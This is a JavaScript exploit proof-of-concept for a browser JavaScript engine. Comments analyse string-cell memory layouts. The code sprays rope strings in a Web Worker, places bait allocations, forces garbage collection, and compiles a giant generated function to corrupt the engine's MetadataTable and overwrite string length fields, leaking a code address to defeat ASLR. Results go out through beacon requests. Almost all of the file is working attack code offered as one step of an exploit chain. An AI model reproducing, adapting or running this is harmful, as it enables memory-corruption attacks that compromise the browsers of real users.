// p375 - MetadataTable sweep: unresolved rope m_length overwrite for ASLR leak
//
// JSString layout analysis:
//   Resolved JSString = 16B cell: [JSCell(8)] [m_fiber/m_value(8)]
//   JSRopeString = 32B cell: [JSCell(8)] [m_fiber(8)] [m_compactFibers(16)]
//     m_compactFibers: m_length(4B @+0x10), m_fiber1Lower(4B), m_fiber1Upper(2B), etc.
//
// For resolved strings (16B): 112 mod 16 = 0, entry+24 always hits m_fiber.
//   .length dereferences corrupted m_fiber as StringImpl -> reads thunk+4 bytes
//   charCodeAt dereferences thunk+8 as data pointer -> SIGSEGV
//
// For UNRESOLVED ropes (32B): 112 mod 32 = 16. Two alternating alignments.
//   Alignment A: entry+24 hits cell+8 (m_fiber) -> same as resolved
//   Alignment B: entry+24 hits cell+24 (m_fiber2Lower area)
//
// BUT: the key insight is entry+12 (m_slowPathCount = 0xFFFFFFFF)
//   Alignment A: entry+12 hits cell+28 (end of compactFibers)
//   Alignment B: entry+12 hits cell+12 (overlaps m_fiber high bytes)
//
// AND entry+68 (bytecodeIndex, 4 bytes):
//   Alignment A: entry+68 hits cell+68 mod 32 = cell+4 (StructureID part)
//   Alignment B: entry+68 hits cell+84 mod 32 = cell+20 (m_fiber1Lower area)
//
// Most importantly, with right base alignment, entry+24 can hit cell+0x10 = m_length!
// If (M + 24) mod 32 = 16: thunk pointer starts at m_length.
// .length on a rope reads m_compactFibers.m_length = low 4 bytes of thunk = ASLR leak!
//
// Strategy: create UNRESOLVED rope strings in Worker. Do NOT call charCodeAt or
// .length before compile. After compile, check .length for suspiciously large values.
// Multiple runs with auto-refresh give different MetadataTable alignments.
//
// Beacon prefix: V375-

(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V375-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {
      try { new Image().src = '/beacon/V375-' + tag + '?t=' + Date.now(); } catch(e2) {}
    }
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT');

  var workerCode = function() {
    var ropes = [];
    var resolved = [];
    var baseUrl = '';
    var ROPE_EXPECTED_LEN = 20;

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', baseUrl + '/beacon/V375-W-' + tag + '?t=' + Date.now(), false);
        x.send('');
      } catch(e) {}
    }

    function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }

      if (e.data.cmd === 'alloc') {
        // Create UNRESOLVED rope strings (32B JSRopeString cells)
        // Concat two strings but do NOT access .length or charCodeAt
        // This keeps them as ropes (m_fiber has isRope bit set)
        for (var i = 0; i < 500; i++) {
          try {
            var left = 'LLLLLLLLLL';
            var right = 'RRRRRRRRRR';
            // Concatenation creates a JSRopeString
            ropes.push(left + right);
            // DO NOT call .length or charCodeAt - must stay as rope
          } catch(ex) { break; }
        }
        beacon('ROPES-' + ropes.length);

        // Also create some resolved strings for comparison
        for (var i = 0; i < 200; i++) {
          try {
            var s = 'AAAAAAAAAA' + 'BBBBBBBBBB';
            s.charCodeAt(0); // force resolution
            resolved.push(s);
          } catch(ex) { break; }
        }
        beacon('RESOLVED-' + resolved.length);

        self.postMessage({ ready: true });
        return;
      }

      if (e.data.cmd === 'scan') {
        beacon('SCANNING');

        // Check ropes: .length should be 20 (10+10) if uncorrupted
        // If m_length was overwritten by thunk, .length will be a large number
        // If m_length was overwritten by bytecodeIndex, .length will be ~80000-90000
        // If m_length was overwritten by 0xFFFFFFFF, .length will be 4294967295
        var ropeHit = 0;
        var ropeCrash = 0;
        var ropeLens = {};

        for (var i = 0; i < ropes.length; i++) {
          try {
            var len = ropes[i].length;
            if (len !== ROPE_EXPECTED_LEN) {
              ropeHit++;
              var key = String(len);
              if (!ropeLens[key]) ropeLens[key] = 0;
              ropeLens[key]++;

              if (ropeHit <= 5) {
                beacon('RHIT-' + i + '-len' + len + '-hex' + len.toString(16));

                // If .length is pointer-like (> 0x10000, < 0xFFFFFFFF),
                // it might be low 32 bits of thunk address
                if (len > 0x10000 && len < 0xFFFFFFFF) {
                  beacon('RPTR-' + i + '-' + len.toString(16));
                }
              }
            }
          } catch(ex) {
            ropeCrash++;
            if (ropeCrash <= 3) beacon('RCRASH-' + i);
          }
        }

        // Report unique .length values
        var lenKeys = [];
        for (var k in ropeLens) lenKeys.push(k + ':' + ropeLens[k]);
        beacon('RLENS-' + lenKeys.join(',').substring(0, 120));
        beacon('RROPE-hit' + ropeHit + '-crash' + ropeCrash);

        // Check resolved strings (16B cells, m_fiber corruption)
        var resHit = 0;
        var resCrash = 0;
        for (var i = 0; i < resolved.length; i++) {
          try {
            var len = resolved[i].length;
            if (len !== ROPE_EXPECTED_LEN) {
              resHit++;
              if (resHit <= 3) beacon('FHIT-' + i + '-len' + len + '-hex' + len.toString(16));
            }
          } catch(ex) {
            resCrash++;
            if (resCrash <= 3) beacon('FCRASH-' + i);
          }
        }
        beacon('FRES-hit' + resHit + '-crash' + resCrash);

        // If we found pointer-like values from ropes, report them
        // These could be: thunk low32, bytecodeIndex, or 0xFFFFFFFF
        // thunk low32 would be in range ~0x200000-0x7FFFFFFF (code region)
        // bytecodeIndex would be in range 0-38348816
        // 0xFFFFFFFF from m_slowPathCount
        beacon('DONE');
        self.postMessage({ done: true });
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var worker = new Worker(URL.createObjectURL(workerBlob));
  var baseUrl = location.protocol + '//' + location.host;
  worker.postMessage({ cmd: 'init', baseUrl: baseUrl });

  // Bait strings (same 100KB marge size as MetadataTable)
  B('BAIT-START');
  var baits = [];
  for (var i = 0; i < 20; i++) {
    var bait = '';
    for (var j = 0; j < 100000; j += 1000) {
      bait += 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB';
    }
    bait = bait.substring(0, 100000);
    bait.charCodeAt(0);
    baits.push(bait);
  }
  B('BAIT-' + baits.length);

  worker.onmessage = function(e) {
    if (e.data.ready) {
      B('WORKER-READY');
      for (var i = 0; i < baits.length; i++) baits[i] = null;
      baits = null;
      var gcR = 0;
      function gc() {
        for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
        for (var j = 0; j < 500; j++) new Array(100).fill(gcR);
        gcR++;
        if (gcR < 30) setTimeout(gc, 30);
        else { B('GC-' + gcR); build(); }
      }
      gc();
    }
    if (e.data.done) B('ALL-DONE');
  };

  worker.postMessage({ cmd: 'alloc' });

  function build() {
    B('BUILD');
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;
    var cc = 'a();'.repeat(CHUNK);
    var p = ['window.__p375fn=function(a){'];
    for (var c = 0; c < nC; c++) p.push(cc);
    p.push('a();'.repeat(rem));
    p.push('};window.__p375ok=true;');
    cc = null;
    var blob = new Blob(p, {type: 'application/javascript'});
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    p = null;
    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onload = function() {
      B('COMPILED-' + (window.__p375ok ? 'OK' : 'FAIL'));
      worker.postMessage({ cmd: 'scan' });
    };
    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
